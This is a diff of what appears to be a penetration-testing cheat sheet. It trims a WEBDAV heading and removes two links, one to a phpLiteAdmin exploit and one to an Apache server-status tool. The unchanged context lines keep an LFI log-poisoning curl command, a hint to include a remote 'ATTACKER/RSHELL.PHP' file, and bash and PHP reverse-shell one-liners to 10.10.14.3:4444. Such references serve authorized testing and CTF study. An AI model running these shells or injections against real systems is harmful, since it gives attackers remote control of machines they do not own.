@@ -542,7 +542,7 @@ Denied from accessing `/robots.txt`?
 Exploit code not working? Try:
 * Full directory paths to binaries and your files e.g. `/usr/bin/wget http:example.com -o /full/path/to/file.txt`
 
-WEBDAV vulns - using tools . 
+WEBDAV vulns - using tools  
 https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_upload_asp  
 http://carnal0wnage.attackresearch.com/2010/05/more-with-metasploit-and-webdav.html  
 ```bash
@@ -577,9 +577,6 @@ Connection: close
 $ curl http://target.com?lfi_file=/var/log/apache2/access.log&cmd=<command>
 ```
 
-phpLiteAdmin 1.9.3 Remote PHP Code Injection:
-* https://v3ded.github.io/ctf/zico2.html
-
 LFI / RFI
 (LFI = HIGH CHANCE OF RFI, SO TRY TO INCLUDE HTTP://ATTACKER/RSHELL.PHP)
 ```
@@ -599,9 +596,6 @@ $ bash -i >& /dev/tcp/10.10.14.3/4444 0>&1
 $ /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.3/4444 0>&1'
 $ php -r '$sock=fsockopen("10.10.14.3",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
-
-Apache
-* Exposed `server-status` page: https://github.com/mazen160/server-status_PWN. Listen in to all requests by clients using this tool, including cookies.
 
 ColdFusion vulns
 * https://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers
